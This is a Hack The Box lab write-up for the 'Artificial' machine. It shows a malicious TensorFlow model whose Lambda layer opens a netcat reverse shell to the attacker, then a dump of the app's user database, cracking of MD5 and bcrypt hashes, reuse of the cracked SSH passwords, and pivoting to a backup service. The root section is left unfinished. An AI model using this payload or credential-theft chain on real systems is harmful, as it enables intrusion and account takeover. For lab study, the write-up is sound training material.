---
file_created: 26 Sep 2025 21:14
title: Artificial
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.74
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/Artificial
user_flag: true
root_flag: true
completed:
date_finish: 2025-09-27
tags:
  - htb/machines
---
# Resolution summary

>[!summary]
>- exploited a **TensorFlow RCE** to gain initial access, needed cpu with AVX Support
>
## Tutorial

```cardlink
url: https://medium.com/@yashadhikari/artificial-hackthebox-walkthrough-linux-easy-d9ef95151a02
title: "Artificial HackTheBox Walkthrough — Exploiting TensorFlow RCE to Gain Root and Escalate Privileges"
description: "HackTheBox Artificial Walkthrough: Exploiting TensorFlow RCE for Web Shells and Linux Privilege Escalation"
host: medium.com
favicon: https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19
image: https://miro.medium.com/v2/resize:fit:689/1*FFlzKrjzcY27JZL67Si7Ug.png
```

## Improved Skills
- Skill 1
- Skill 2

## Tools Used 
- rustscan ; nmap ; gobuster ; ffuf

---
# Environment Setup
```bash
export HOST_IP=10.10.14.112
export TARGET_IP=10.10.11.74
export DOMAIN=artificial.htb
{
  echo "HOST_IP=${HOST_IP:-}"
  echo "TARGET_IP=${TARGET_IP:-}"
  echo "DOMAIN=${DOMAIN:-}"
} > .env
source .env
```
---
# Information Gathering

## Scanned all TCP ports:
```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
## Enumerated open ports:
```bash
nmap -sC -sV -Pn $IP -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumerated Top 200 UDP Ports
Scanned the top 200 UDP ports to ensure no additional services were missed:
```bash
nmap -sU --top-ports 200 -oN $IP
```
---
# Enumeration

## Port 80 - HTTP (nginx)
nginx 1.18.0 
### Configuration
- Need to redirect to `http://artificial.htb`
```bash
echo "$TARGET_IP artificial.htb" | sudo tee -a /etc/hosts
```
### Subdomain enumeration with `ffuf`
```bash
ffuf -H "Host: FUZZ.$DOMAIN" -u http://$DOMAIN/ -w $WORDLISTS/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --fw 4
```
### **Homepage**

![](<./attachments/Artificial.png>)
### 404 error page
![](<./attachments/Artificial-1.png>)
[Flask](https://flask.palletsprojects.com/en/3.0.x/) is a Python web framework. The default 404 page looks like
**matches**
```html
<!doctype html> <html lang=en> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
### Login page
![](<./attachments/Artificial-2.png>)
>`test@mail.com`:`TESTER1234`

---
# Exploitation

## Web Exploitation (TensorFlow RCE)

After logging in to the dashboard, there is an **Upload** section where the `requirements.txt` and `Dockerfile` links are provided.
Below is an example of a Dockerfile:
```docker
FROM python:3.8-slim  
  
WORKDIR /code  
  
RUN apt-get update && \  
apt-get install -y curl && \  
curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \  
rm -rf /var/lib/apt/lists/*  
  
RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl  
  
ENTRYPOINT ["/bin/bash"]
```

### Setting Up a Docker Environment for the TensorFlow Exploit

Both `requirements.txt` and `Dockerfile` were downloaded to my `exploit` folder. Before building the Docker environment for the exploit, first created a payload script in the same directory.

#### **Step 1: Create the Payload Script**

In my `exploit` folder, I created a file called `exploit.py`. This script contains my TensorFlow payload:

```python title:exploit.py
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $HOST-IP 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
**Note:** `$HOST-IP` is variable `<MY-IP>`with the IP address of my attacking machine.

#### **Step 2: Build the Docker Image**
Next, I opened a terminal in the `exploit` folder and ran:

```bash
sudo docker build -t artificial-exploit .
```
This built a Docker image with Python 3.8 and TensorFlow 2.13.1 installed, which matched the target environment.

#### **Step 3: Run the Docker Container with a Shared Volume**
To ensure that the payload file would appear on my host system, I ran:

```bash
sudo docker run -it -v $(pwd):/app artificial-exploit
```
- `$(pwd)` maps the current host folder to `/app` inside the container.
- Any files saved in `/app` inside the container automatically appear on the host.

#### **Step 4: Generate the Payload Inside Docker**
Inside the container, navigated to `/app` and executed the script:
```bash
cd /app  
python3 exploit.py
```
The file `exploit.h5` was generated in `/app` and also appeared in host folder.

#### **Step 5: Start a Listener for the Reverse Shell**
On local machine,  started a netcat listener to catch the reverse shell:
```bash
nc -nlvp 4444
```
Once the model executed on the web server, listener successfully caught the connection, giving me a shell.
#### **Step 6: Upload the Payload to the Web**
- Go to the dashboard, select the `exploit.h5` file, and upload the model. 
- After uploading, execute the payload by clicking on **View Predictions**.
![](<./attachments/Artificial-3.png>)
It will trigger the reverse shell, and a shell will appear in your Netcat listener terminal.
![](<./attachments/Artificial-4.png>)
### Stabilizing the Reverse Shell
With a reverse shell established, next move was to make it stable for smoother interaction.

started by spawning a fully interactive TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm
```
This gave me proper terminal capabilities like `clear`, tab completion, and arrow key navigation.

Next, backgrounded the shell with `Ctrl + Z`, then in my local terminal ran:
```bash
stty raw -echo; fg  
stty rows 38 columns 116
```
Now fully functional, responsive shell ,essential for privilege escalation and post-exploitation work.

---
# Lateral Movement to gael

## Local enumeration
### search User.txt
searched the system for the `user.txt` file by running:
```bash
find / -type f -name "user.txt" 2>/dev/null
```

**It returned the path:**
```bash
/home/gael/user.txt
```
### Gaining Users
landed shell as the `app` user, my first instinct was to **enumerate the application directory**.
```bash
ls -la
```
Immediately saw something interesting. A folder called `instance` and a file named `users.db`.  
- That `.db` extension screamed **SQLite**.
- Since Flask (and many Python web apps) often store their data in an SQLite database inside an `instance/` folder, this made me suspicious that I could dump user credentials straight from it.
**confirmed hunch by running:**
```bash
file instance/users.db
```
Returned `SQLite 3.x database`.

```sql
sqlite3 instance/users.db
```
Once in the SQLite shell, I listed all tables:

```sql
.tables
```
 saw two tables:
 ```bash
 model user
 ```
The `user` table caught my attention immediately. Inspected its schema:
```sql
PRAGMA table_info(user);
```
That showed fields for `id`, `username`, `email`, and `password`.

Final step was to dump the contents:
```sql
SELECT * FROM user;
```
And just like that, had **all the usernames, emails, and hashed passwords** for every account on the application.
![](<./attachments/Artificial-5.png>)
### **Dumping and Cracking Password Hashes**
From shell, I dumped the stored password hashes directly from the database (after exiting the SQLite prompt with `.quit` if needed):
```sql
sqlite3 instance/users.db "SELECT password FROM user;"
```

Instead of transferring the file, quickly copied all hashes, created a file locally, and saved them:
```bash
echo "c99175974b6e192936d97224638a34f8  
0f3d8c76530022670f1c6029eed09ccb  
b606c5f5136170f15444251665638b36  
bc25b1f80f544c0ab451c02a3dca9fc6  
bf041041e57f1aff3be7ea1abd6129d0  
8ec161b7dfed598de01e29668540e01c  
10538528e83ff3ce84b69c623c402df2  
e55d8b461e966a18d7f4631713674035  
e55d8b461e966a18d7f4631713674035" > hash.txt
```
With the hashes saved, used **Hashcat** on my attacker machine to crack them with the `rockyou.txt` wordlist:
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force  
hashcat -m 0 hash.txt --show
```
### Cracked Credentials

Running Hashcat against the `rockyou.txt` wordlist quickly revealed two valid credentials:
```txt
gael : mattp005numbertwo  
robert : marwinnarak043414036
```

These were likely real user accounts on the target system. With this information in hand, next step was to attempt **SSH login** to see if either account had remote access privileges.
## Lateral movement vector
### SSH
```bash
ssh gael@10.10.11.74 #mattp005numbertwo
```

```sh
sshpass -p 'mattp005numbertwo' ssh gael@10.10.11.74 -p22
```

The `gael` account allowed me to log in successfully. I also tested the other cracked account (`robert`) in case multiple users had SSH access.

If a user is blocked from SSH, I check which accounts have valid shells and whether `AllowUsers` restrictions are in place:
```bash
getent passwd | awk -F: '$7 ~ /sh$/ {print $1 ":" $7}'
```
**Output**:
```md
root:/bin/bash  
gael:/bin/bash  
app:/bin/bash
```

`robert` appeared to be a web user without a valid shell. also confirmed there were no `AllowUsers` restrictions:
```bash
grep -i AllowUsers /etc/ssh/sshd_config 2>/dev/null || true
```

---
# Privilege Escalation to xxx

## Local enumeration
Performed a quick enumeration to gather system information and look for potential privilege escalation paths
>gael:mattp005numbertwo
```bash
id; whoami; hostnamectl  
ss -tulnp | grep LISTEN  
ls -la /var/backups
sudo -l 
```
**Findings**:
- `gael` was **not** a sudo user.
- A backup archive existed at `/var/backups/backrest_backup.tar.gz`.
- An internal service was listening on `127.0.0.1:9898`.
## Privilege Escalation vector
### Exfiltrating and Cracking Backup Credentials

Instead of using `nc`, I decided to pull the backup directly to my attacker machine using `scp`:

**On attacker machine:**
```bash
scp gael@10.10.11.74:/var/backups/backrest_backup.tar.gz .
#mattp005numbertwo
```

The file `backrest_backup.tar.gz` turned out to be a plain TAR archive, not GZIP-compressed. Rename it and extract without the `z` flag:
```bash
mv backrest_backup.tar.gz backrest_backup.tar
tar -xvf backrest_backup.tar
```

While searching the extracted files, I located a configuration file .I inspected the `config.json` file and found a bcrypt-encoded password. After extracting the hash,  saved it to a file:

```bash
cat backrest/.config/backrest/config.json  
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP'| base64 -d > /tmp/bcrypt.hash
```
 used **Hashcat** with the `rockyou.txt` wordlist to crack it:
```bash
hashcat -m 3200 /tmp/bcrypt.hash /usr/share/wordlists/rockyou.txt --force
```
Once cracking was complete, I displayed the result:
```bash
hashcat -m 3200 /tmp/bcrypt.hash --show
```
The cracked password was:
```txt
!@#$%^
```

## Pivoting to the Internal Service

These credentials belonged to an **admin account** for a local web service running on port `9898`. I port-forwarded it to my machine:
```bash
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
#mattp005numbertwo
```
Then accessed it via:
- use firefox 
```txt
http://localhost:9898 
```

Login details:
![](<./attachments/Artificial-6.png>)
>backrest_root:!@#$%^
![](<./attachments/Artificial-7.png>)
## **Abusing Restic for Root Access**
Once I had admin access to the Backrest web interface, I saw an opportunity to abuse its restore feature to send backups to a server I controlled. For that, I needed to set up a Restic-compatible listener.

While looking into privilege escalation options, I came across the `sudo restic` entry on GTFOBins. This stood out because, when run as root via `sudo`, Restic doesn’t drop its elevated privileges. That means it can be used to read sensitive files, escalate privileges, or maintain root access.

---
# Trophies

## User Flag
```txt
42550009838ced1ae7aa3a56397487b6
```
## Root Flag
```txt
```
## **/etc/shadow**

```bash

```

---
# **Conclusion**

Exploited a **TensorFlow RCE** to gain initial access, cracked user credentials, and leveraged **Backrest and Restic** backups to achieve **root access**.
## Key Takeaways

- ML frameworks can introduce unexpected RCE vectors.
- Web app databases often hold sensitive credentials.
- Backups and internal services are common privilege escalation points.
# Proof
![](<./attachments/Artificial-8.png>)